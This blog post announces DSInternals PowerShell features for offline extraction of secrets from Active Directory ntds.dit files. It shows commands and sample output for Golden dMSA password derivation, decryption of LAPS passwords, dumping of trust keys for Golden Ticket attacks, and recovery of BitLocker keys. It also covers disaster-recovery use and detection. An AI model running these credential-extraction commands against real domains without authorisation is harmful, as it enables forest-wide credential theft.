---
ref: dsinternals-v6
title: Juicing ntds.dit Files to the Last Drop
date: '2025-08-14T00:00:00+00:00'
layout: post
lang: en
image: /assets/images/encrypted-laps-offline.png
permalink: /en/active-directory-offline-attacks-dsinternals-v6/
---

*This blog post has originally been published at the [SpecterOps Blog](https://specterops.io/blog/2025/08/14/juicing-ntds-dit-files-last-drop-dsinternals-powershell-active-directory-offline-attacks/).*

## Introduction

Several new Active Directory offline attack capabilities have recently been added to the [DSInternals PowerShell module](https://www.powershellgallery.com/packages/DSInternals).
These enhancements include the **Golden dMSA Attack**, full support for Local Administrator Password Solution (**LAPS**), and the ability to extract **trust passwords** and **BitLocker** recovery keys.
And thanks to some changes made under the hood, large ntds.dit files (100K+ users) process much faster
and it is now possible to read databases originating from read-only domain controllers (**RODCs**).
As a result, *DSInternals* can access all types of secret and confidential information stored in **ntds.dit** files,
solidifying its status as the most comprehensive and feature-rich tool in its category.

## Offline Golden dMSA Attack

The [Get-ADDBServiceAccount](https://github.com/MichaelGrafnetter/DSInternals/blob/master/Documentation/PowerShell/Get-ADDBServiceAccount.md#get-addbserviceaccount) cmdlet now retrieves both [msDS-GroupManagedServiceAccount (gMSA)](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/group-managed-service-accounts/group-managed-service-accounts/manage-group-managed-service-accounts) (introduced in Windows Server 2012) and [msDS-DelegatedManagedServiceAccount (dMSA)](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview) (introduced in Windows Server 2025) object types from ntds.dit files and calculates their current managed passwords using **KDS Root Keys** also stored in the database. Depending on the account type, the attacks are referred to as **Golden gMSA** or **Golden dMSA**.

Example:

```powershell
Get-ADDBServiceAccount -DatabasePath 'C:\ADBackup\ntds.dit'
```

Sample output:

```yml
DistinguishedName: CN=svc_adfs,CN=Managed Service Accounts,DC=contoso,DC=com
Sid: S-1-5-21-2468531440-3719951020-3687476655-1109
Guid: 53c845f7-d9cd-471b-a364-e733641dcc86
SamAccountName: svc_adfs$
Description: ADFS Service Account
Enabled: True
Deleted: False
UserAccountControl: WorkstationAccount
SupportedEncryptionTypes: RC4_HMAC, AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96
ServicePrincipalName: {http/login.contoso.com, host/login.contoso.com}
WhenCreated: 9/9/2023 5:02:05 PM
PasswordLastSet: 9/9/2023 5:02:06 PM
ManagedPasswordInterval: 30
ManagedPasswordId: RootKey=7dc95c96-fa85-183a-dff5-f70696bf0b11, Cycle=9/9/2023 10:00:00 AM (L0=361, L1=26, L2=24)
ManagedPasswordPreviousId:
KDS Derived Secrets (Calculated)
  EffectivePasswordId: RootKey=7dc95c96-fa85-183a-dff5-f70696bf0b11, Cycle=6/25/2025 8:00:00 PM (L0=363, L1=11, L2=29)
  NTHash: 0b5fbfb646dd7bce4f160ad69edb86ba
  Kerberos Keys
    AES256_CTS_HMAC_SHA1_96
      Key: 5dcc418cd0a30453b267e6e5b158be4b4d80d23fd72a6ae4d5bd07f023517117
      Iterations: 4096
    AES128_CTS_HMAC_SHA1_96
      Key: 8e1e66438a15d764ae2242eefd15e09a
      Iterations: 4096
```

<!--more-->

This means that if a malicious actor obtains a backup of a domain controller (DC), regardless of whether it's an old backup containing historic password hashes,
they can still derive the current passwords of managed service accounts.
As a next step, they could use them to authenticate against Active Directory or to impersonate any user over Kerberos against the corresponding services by launching a [Silver Ticket attack](https://attack.mitre.org/techniques/T1558/002/).
One common target for such attacks is Active Directory Federation Services (ADFS), which often provides access to cloud services like Microsoft 365 and Amazon AWS.

KDS Root Keys are stored in the Configuration partition, making their use applicable across the entire forest. This highlights the well-known fact that a domain is not a security boundary; in some cases, a [forest may not serve as a security boundary either](https://posts.specterops.io/not-a-security-boundary-breaking-forest-trusts-cd125829518d).
A minor complication arises from the fact that the [ms-DS-ManagedPasswordId](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-managedpasswordid) attribute of managed service accounts is not replicated to Global Catalogs.
Fortunately, this attribute is publicly readable over LDAP.

[Microsoft's article on recovering from a Golden gMSA attack](https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/recover-from-golden-gmsa-attack) applies to the Golden dMSA Attack as well.
Unfortunately, the recommended incident response procedure is more intricate than simply generating a new KDS Root Key; it involves an authoritative restore of Active Directory:

![Diagram of an example gMSAs timeline.](https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/media/recover-from-golden-gmsa-attack/gmsas-timeline.png)

## Encrypted Windows LAPS Password Recovery

The [Get-ADDBAccount](https://github.com/MichaelGrafnetter/DSInternals/blob/master/Documentation/PowerShell/Get-ADDBAccount.md#get-addbaccount) cmdlet can now decrypt all [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview) passwords using KDS Root Keys in offline mode, including [msLAPS-EncryptedPassword](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada2/b6ea7b78-64da-48d3-87cb-2cff378e4597), [msLAPS-EncryptedPasswordHistory](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada2/1b76b573-1dc8-4b64-a05d-a8527e3f56a7), [msLAPS-EncryptedDSRMPassword](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference#mslaps-encrypteddsrmpassword), and [msLAPS-EncryptedDSRMPasswordHistory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference#mslaps-encrypteddsrmpasswordhistory) attributes. This allows for the retrieval of LAPS password even during Active Directory disaster recovery scenarios. The [ms-LAPS-Password](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada2/b2e01af2-3ff5-4c64-8ef3-d0d8a545945b) and [ms-Mcs-AdmPwd](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada2/ad2ce8fa-42a0-4371-ad18-5d1d1c488b22) attributes, containing Windows LAPS and Legacy Microsoft LAPS cleartext passwords, respectively, can also be accessed.

Example:

```powershell
Get-ADDBAccount -DatabasePath 'C:\ADBackup\ntds.dit' -All -Properties LAPS |
    Select-Object -ExpandProperty LapsPasswords
```

Sample output:

```txt
ComputerName Account       Password                 Expires   Source
------------ -------       --------                 -------   -----
DC01         Administrator PluralTrimmingSuggest    2/3/2025  EncryptedDSRMPassword
DC02         Administrator RoundupFructoseRoundworm 2/3/2025  EncryptedDSRMPassword
ADFS01       WLapsAdmin    HerbsSkidUnproven        2/3/2025  EncryptedPassword
PC01         Administrator A6a3#7%eb!57be4a4B95Z433 1/24/2025 CleartextPassword
```

Note that a [similar feature is available from Microsoft](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory#retrieve-passwords-during-windows-server-active-directory-disaster-recovery-scenarios) in Windows Insider build 27695 and later. This feature requires the installation of RSAT and currently has some compatibility issues with [VM Generation ID](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/introduction-to-active-directory-domain-services-ad-ds-virtualization-level-100#virtualization-based-safeguards).
As a result, even though an official tool is available, DSInternals remains faster and easier to use.

## Read-Only Domain Controllers (RODCs)

The [Get-ADDBAccount](https://github.com/MichaelGrafnetter/DSInternals/blob/master/Documentation/PowerShell/Get-ADDBAccount.md#get-addbaccount) cmdlet
can now be used to decrypt ntds.dit files originating from RODCs:

```powershell
Get-ADDBAccount -DatabasePath 'C:\ADBackup\ntds.dit' `
                -BootKey e8502c7e1efb193eec3b625981ad90ed `
                -All `
                -ExportFormat HashcatNT |
    Where-Object NTHash -ne $null
```

Sample output:

```txt
john:92937945b518814341de3f726500d4ff
DMZ-WWW$:c53a1d6ce3b391432863073cea763915
krbtgt_20781:06bc0b46fa3ea0d2d28168366d61053b
DMZ-RODC$:8a6cf405873a668b2f4ab847a0450cc1
```

As we can observe in the output, only a limited number of account password hashes are present in the database.
This is because the [Password Replication Policy](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc730883(v=ws.10))
blocks secret attributes of most accounts from being cached on RODCs. A **secret attribute** is any attribute from the following set hardcoded in the Windows source code:

- [unicodePwd](https://learn.microsoft.com/en-us/windows/win32/adschema/a-unicodepwd)
- [dBCSPwd](https://learn.microsoft.com/en-us/windows/win32/adschema/a-dbcspwd)
- [ntPwdHistory](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ntpwdhistory)
- [lmPwdHistory](https://learn.microsoft.com/en-us/windows/win32/adschema/a-lmpwdhistory)
- [supplementalCredentials](https://learn.microsoft.com/en-us/windows/win32/adschema/a-supplementalcredentials)
- [trustAuthIncoming](https://learn.microsoft.com/en-us/windows/win32/adschema/a-trustauthincoming)
- [trustAuthOutgoing](https://learn.microsoft.com/en-us/windows/win32/adschema/a-trustauthoutgoing)
- [initialAuthIncoming](https://learn.microsoft.com/en-us/windows/win32/adschema/a-initialauthincoming)
- [initialAuthOutgoing](https://learn.microsoft.com/en-us/windows/win32/adschema/a-initialauthoutgoing)
- [currentValue](https://learn.microsoft.com/en-us/windows/win32/adschema/a-currentvalue)
- [priorValue](https://learn.microsoft.com/en-us/windows/win32/adschema/a-priorvalue)

As a result, we will not find trust passwords or [DPAPI Backup Keys](https://posts.specterops.io/operational-guidance-for-offensive-user-dpapi-abuse-1fb7fac8b107) on RODCs.
Moreover, the following AD attributes included in the **RODC filtered attribute set** never replicate to RODCs:

- [msFVE-KeyPackage](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msfve-keypackage)
- [msFVE-RecoveryPassword](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msfve-recoverypassword)
- [msKds-CreateTime](https://learn.microsoft.com/en-us/windows/win32/adschema/a-mskds-createtime)
- [msKds-DomainID](https://learn.microsoft.com/en-us/windows/win32/adschema/a-mskds-domainid)
- [msKds-KDFAlgorithmID](https://learn.microsoft.com/en-us/windows/win32/adschema/a-mskds-kdfalgorithmid)
- [msKds-KDFParam](https://learn.microsoft.com/en-us/windows/win32/adschema/a-mskds-kdfparam)
- [msKds-PrivateKeyLength](https://learn.microsoft.com/en-us/windows/win32/adschema/a-mskds-privatekeylength)
- [msKds-PublicKeyLength](https://learn.microsoft.com/en-us/windows/win32/adschema/a-mskds-publickeylength)
- [msKds-RootKeyData](https://learn.microsoft.com/en-us/windows/win32/adschema/a-mskds-rootkeydata)
- [msKds-SecretAgreementAlgorithmID](https://learn.microsoft.com/en-us/windows/win32/adschema/a-mskds-secretagreementalgorithmid)
- [msKds-SecretAgreementParam](https://learn.microsoft.com/en-us/windows/win32/adschema/a-mskds-secretagreementparam)
- [msKds-UseStartTime](https://learn.microsoft.com/en-us/windows/win32/adschema/a-mskds-usestarttime)
- [msKds-Version](https://learn.microsoft.com/en-us/windows/win32/adschema/a-mskds-version)
- [msLAPS-CurrentPasswordVersion](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference#mslaps-currentpasswordversion)
- [msLAPS-EncryptedDSRMPassword](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference#mslaps-encrypteddsrmpassword)
- [msLAPS-EncryptedDSRMPasswordHistory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference#mslaps-encrypteddsrmpasswordhistory)
- [msLAPS-EncryptedPassword](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference#mslaps-encryptedpassword)
- [msLAPS-EncryptedPasswordHistory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference#mslaps-encryptedpasswordhistory)
- [msLAPS-Password](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference#mslaps-password)
- [msPKIAccountCredentials](https://learn.microsoft.com/en-us/windows/win32/adschema/a-mspkiaccountcredentials)
- [msPKIDPAPIMasterKeys](https://learn.microsoft.com/en-us/windows/win32/adschema/a-mspkidpapimasterkeys)
- [msPKIRoamingTimeStamp](https://learn.microsoft.com/en-us/windows/win32/adschema/a-mspkiroamingtimestamp)
- [msTPM-OwnerInformation](https://learn.microsoft.com/en-us/windows/win32/adschema/a-mstpm-ownerinformation)
- [msTPM-OwnerInformationTemp](https://learn.microsoft.com/en-us/windows/win32/adschema/a-mstpm-ownerinformationtemp)

The attributes mentioned above store BitLocker recovery keys, Windows LAPS passwords, KDS Root Keys, and credential roaming data, making RODC databases even less usable to attackers.

However, it is important to note that the [userPassword](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/f3adda9f-89e1-4340-a3f2-1f0a6249f1f8) and [unixUserPassword](https://learn.microsoft.com/en-us/windows/win32/adschema/a-unixuserpassword)
attributes are always replicated to RODCs. While the unixUserPassword attribute is at least [marked as confidential](https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/mark-attribute-as-confidential) in the default AD schema,
the **Authenticated Users can read the userPassword attribute of all users from RODCs**. And yes, we have seen some companies storing cleartext user passwords in these attributes.

## Trust Passwords

The new [Get-ADDBTrust](https://github.com/MichaelGrafnetter/DSInternals/blob/master/Documentation/PowerShell/Get-ADDBTrust.md#get-addbtrust) cmdlet
can read AD trust objects, decrypt cleartext trust passwords from the [trustAuthIncoming](https://learn.microsoft.com/en-us/windows/win32/adschema/a-trustauthincoming)
and [trustAuthOutgoing](https://learn.microsoft.com/en-us/windows/win32/adschema/a-trustauthoutgoing) attributes,
and even derive the corresponding Kerberos keys to be used in cross-domain or cross-forest [Golden Ticket attacks](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61):

```powershell
Get-ADDBTrust -DatabasePath 'C:\ADBackup\ntds.dit' `
              -BootKey c53a1d6ce3b391432863073cea763915
```

Sample output:

```txt
DistinguishedName: CN=adatum.com,CN=System,DC=contoso,DC=com
TrustPartner: adatum.com
FlatName: adatum
Sid: S-1-5-21-2072939287-465948493-1385512467
Direction: Bidirectional
Source: contoso.com
SourceFlatName: contoso
Type: Uplevel
Attributes: ForestTransitive
SupportedEncryptionTypes: AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96
Deleted: False
TrustAuthIncoming
  CurrentPassword: 鑵׶肞뚙ᝑ꣤ς搏ﴲᛍ⨾녰钳맦
  CurrentNTHash: a00b29a3ab2fe08bf169096798193290
  PreviousPassword: Pa$$w0rd
  PreviousNTHash: 92937945b518814341de3f726500d4ff
IncomingTrustKeys (Calculated)
  Credentials:
    AES256_CTS_HMAC_SHA1_96
      Key: f253328c380a20b24c59866ab5a4f222a7fdec9de05502b261de6bbccd392da9
      Iterations: 4096
    AES128_CTS_HMAC_SHA1_96
      Key: 039d99f0b5c78bd7d07e0fed28fe2cf8
      Iterations: 4096
    DES_CBC_MD5
      Key: 0ee92c61b66b5d0d
      Iterations: 4096
  OldCredentials:
    AES256_CTS_HMAC_SHA1_96
      Key: ab18197b48942fcbb8dab398f1b78fcbad8a223ff6779eb332f42f21655f5aa0
      Iterations: 4096
    AES128_CTS_HMAC_SHA1_96
      Key: 676c6a1e69f0ec7d78010e75e9c24b6f
      Iterations: 4096
    DES_CBC_MD5
      Key: 2afbc7d94fa4ab29
      Iterations: 4096
  OlderCredentials:
  ServiceCredentials:
  Salt: CONTOSO.COMkrbtgtadatum
  DefaultIterationCount: 4096
  Flags: 0
TrustAuthOutgoing
  CurrentPassword: 쩘僞◀ꝵ黠鯹안꽾仈퍯䢥鉑꾲
  CurrentNTHash: ea1d78e82a3e496eb65ccd9a108575d0
  PreviousPassword: Pa$$w0rd
  PreviousNTHash: 92937945b518814341de3f726500d4ff
OutgoingTrustKeys (Calculated)
  Credentials:
    AES256_CTS_HMAC_SHA1_96
      Key: 25668ca9f03154e3cf0509a01f51bb3a5fcac8200e69eb542e6f2ad4609d39ce
      Iterations: 4096
    AES128_CTS_HMAC_SHA1_96
      Key: 65a4c7a238f2cf8146f15db4dfda4bad
      Iterations: 4096
    DES_CBC_MD5
      Key: d90425dc58571a86
      Iterations: 4096
  OldCredentials:
    AES256_CTS_HMAC_SHA1_96
      Key: 214a5078f4fdb6405ca669a4ce9662cb631989d331585ce115c769c7218f6583
      Iterations: 4096
    AES128_CTS_HMAC_SHA1_96
      Key: efc764b4de373d40c3e9b173c0ee3a47
      Iterations: 4096
    DES_CBC_MD5
      Key: 9ec1cbd9163da72a
      Iterations: 4096
  OlderCredentials:
  ServiceCredentials:
  Salt: ADATUM.COMkrbtgtcontoso
  DefaultIterationCount: 4096
  Flags: 0

DistinguishedName: CN=MIT.EDU,CN=System,DC=contoso,DC=com
TrustPartner: MIT.EDU
FlatName: MIT.EDU
Sid:
Direction: Outbound
Source: contoso.com
SourceFlatName: contoso
Type: MIT
Attributes: DisallowTransivity
SupportedEncryptionTypes:
Deleted: False
TrustAuthIncoming
  CurrentPassword:
  CurrentNTHash:
  PreviousPassword:
  PreviousNTHash:
IncomingTrustKeys (Calculated)
TrustAuthOutgoing
  CurrentPassword: Pa$$w0rd
  CurrentNTHash: 92937945b518814341de3f726500d4ff
  PreviousPassword: Pa$$w0rd
  PreviousNTHash: 92937945b518814341de3f726500d4ff
OutgoingTrustKeys (Calculated)
  Credentials:
    AES256_CTS_HMAC_SHA1_96
      Key: 86382b311288ae8e1bf0157ac93849ae4f4f84a9a2e71aea57c2a8936067f486
      Iterations: 4096
    AES128_CTS_HMAC_SHA1_96
      Key: b28d2d6afd811c05de733ae143cf9d06
      Iterations: 4096
    DES_CBC_MD5
      Key: 3bd940c1f79b79ce
      Iterations: 4096
  OldCredentials:
    AES256_CTS_HMAC_SHA1_96
      Key: 86382b311288ae8e1bf0157ac93849ae4f4f84a9a2e71aea57c2a8936067f486
      Iterations: 4096
    AES128_CTS_HMAC_SHA1_96
      Key: b28d2d6afd811c05de733ae143cf9d06
      Iterations: 4096
    DES_CBC_MD5
      Key: 3bd940c1f79b79ce
      Iterations: 4096
  OlderCredentials:
  ServiceCredentials:
  Salt: MIT.EDUkrbtgtcontoso
  DefaultIterationCount: 4096
  Flags: 0
```

## BitLocker Recovery Keys

The recently added [Get-ADDBBitLockerRecoveryInformation](https://github.com/MichaelGrafnetter/DSInternals/blob/master/Documentation/PowerShell/Get-ADDBBitLockerRecoveryInformation.md#get-addbbitlockerrecoveryinformation)
cmdlet can read all [ms-FVE-RecoveryInformation](https://learn.microsoft.com/en-us/windows/win32/adschema/c-msfve-recoveryinformation) objects from an AD database file:

```powershell
Get-ADDBBitLockerRecoveryInformation -All -DatabasePath 'C:\ADBackup\ntds.dit'
```

Sample output:

```
ComputerName RecoveryGuid                         RecoveryPassword
------------ ------------                         ----------------
PC01         704b1998-54ea-4899-8f46-81628b6a0731 366561-423260-035024-137224-631070-580492-357566-596908
PC02         caeaa622-6c6a-4d2b-8e33-29e46df659af 782066-216356-283624-291397-405614-078166-321530-943804
#>
```

This new capability might be especially useful in disaster recovery scenarios, when AD is not yet fully operational.

## Performance Improvements

The database access layer has been rewritten to use partitioned indexes when loading AD schema or reading accounts from ntds.dit files,
resulting in noticeable performance improvements, especially when parsing large databases containing 100K+ users.

The [Get-ADDBAccount](https://github.com/MichaelGrafnetter/DSInternals/blob/master/Documentation/PowerShell/Get-ADDBAccount.md#get-addbaccount) cmdlet can read AD databases up to 10 times faster
when the new `-Properties` parameter is used to specify only a subset of attributes to retrieve for each account. The accepted values are:

- `DistinguishedName` - Due to the way objects are stored in AD, reading distinguished names is a relatively expensive operation.
- `GenericInfo`
  - `GenericAccountInfo` - Includes common public attributes like UPN, last logon time, SID history, or description.
  - `GenericUserInfo` - Includes public attributes of user accounts like their first and last names, emails, or employee numbers.
  - `GenericComputerInfo` - Includes public attributes of computer accounts like their DNS names or operating system versions.
- `SecurityDescriptor` - Reading and parsing ACLs is a relatively expensive operation.
- `Secrets`
  - `PasswordHashes`
    - `NTHash` - NT hashes (MD4) of passwords.
    - `LMHash` - Legacy LM hashes of passwords that AD no longer uses.
  - `PasswordHashHistory`
    - `NTHashHistory` - Historical values of NT hashes.
    - `LMHashHistory` - Historical values of the legacy LM hashes.
  - `SupplementalCredentials` - Kerberos keys and MD5 password hashes.
- `KeyCredentials` - NGC and STK public keys.
- `RoamedCredentials` - Credential roaming data, including certificates and DPAPI master keys.
- `LAPS`
  - `WindowsLAPS` - Attributes related to Windows LAPS.
  - `LegacyLAPS` - Attributes related to the legacy Microsoft LAPS.
- `ManagedBy` - Due to the way objects are stored in AD, reading distinguished names is a relatively expensive operation.
- `Manager` - Due to the way objects are stored in AD, reading distinguished names is a relatively expensive operation.

As a convenience, the [-ExportFormat](https://github.com/MichaelGrafnetter/DSInternals/tree/master/Documentation/PowerShell#password-hash-export-formats) parameter automatically pre-selects the required attribute set.

## Better Safe Than Sorry

The Active Directory database undoubtedly contains highly sensitive credentials
that an attacker could exploit to compromise corporate infrastructure.
Additionally, AD is an authoritative source of personally identifiable information (PII),
such as names, phone numbers, addresses, and employee numbers, which are subject to various regulations.
This data must always be handled in a compliant manner, and security assessments or penetration tests should be no exception.

The [Test-PasswordQuality](https://github.com/MichaelGrafnetter/DSInternals/blob/master/Documentation/PowerShell/Test-PasswordQuality.md#test-passwordquality) cmdlet, part of the DSInternals PowerShell module,
has gained popularity among auditors for conducting password security assessments.
The command is intentionally designed to perform in-memory password hash analysis only,
without displaying any credentials on the screen or exporting them to text files.

Regardless of intent, the Security Operations Center (SOC) team should ideally detect any manipulation of the ntds.dit database files.
ITDR, EDR, or XDR solutions can assist in this regard. As an example, here is [Microsoft's Defender for Endpoint (MDE) detecting the exfiltration of an Active Directory database](https://www.microsoft.com/en-us/security/blog/2022/10/18/defenders-beware-a-case-for-post-ransomware-investigations#ntds-dit-dumping):

![Defender for Endpoint alert from ntds.dit dump](https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2022/10/FO2-22-ntdsutil2-1024x962.png)

![Screenshot of a command copying NTDS.dit from a volume shadow copy.](https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2022/10/FO2-23-copying-NTDS-1024x158.png)